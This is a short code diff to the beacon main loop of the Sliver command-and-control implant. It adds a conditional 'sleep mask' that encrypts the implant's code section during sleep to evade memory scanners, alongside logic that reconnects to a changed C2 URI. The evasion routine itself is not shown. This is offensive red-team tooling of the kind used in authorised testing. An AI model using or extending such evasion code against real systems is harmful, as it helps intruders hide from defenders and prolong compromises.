@@ -44,6 +44,9 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	// {{if .Config.Evasion}}
+	"github.com/bishopfox/sliver/implant/sliver/evasion"
+	// {{end}}
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -291,6 +294,23 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] sleep until %v", nextCheckin)
 		// {{end}}
+		// {{if .Config.Evasion}}
+		// Sleep mask: encrypt .text section during sleep to evade memory scanners
+		sleepDone := make(chan struct{})
+		go func() {
+			defer func() {
+				recover() // Prevent deadlock if SleepMask panics
+				close(sleepDone)
+			}()
+			evasion.SleepMask(duration)
+		}()
+		select {
+		case <-errors:
+			return err
+		case <-sleepDone:
+		case <-shortCircuit:
+		}
+		// {{else}}
 		select {
 		case <-errors:
 			return err
@@ -298,8 +318,9 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-shortCircuit:
 			// Short circuit current duration with no error
 		}
+		// {{end}}
 
-		// check if reconfig used to set a new C2-URI 
+		// check if reconfig used to set a new C2-URI
 		if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
 			// {{if .Config.Debug}}
 			log.Printf("[beacon] C2 URI changed to %s, reconnecting...", c2)
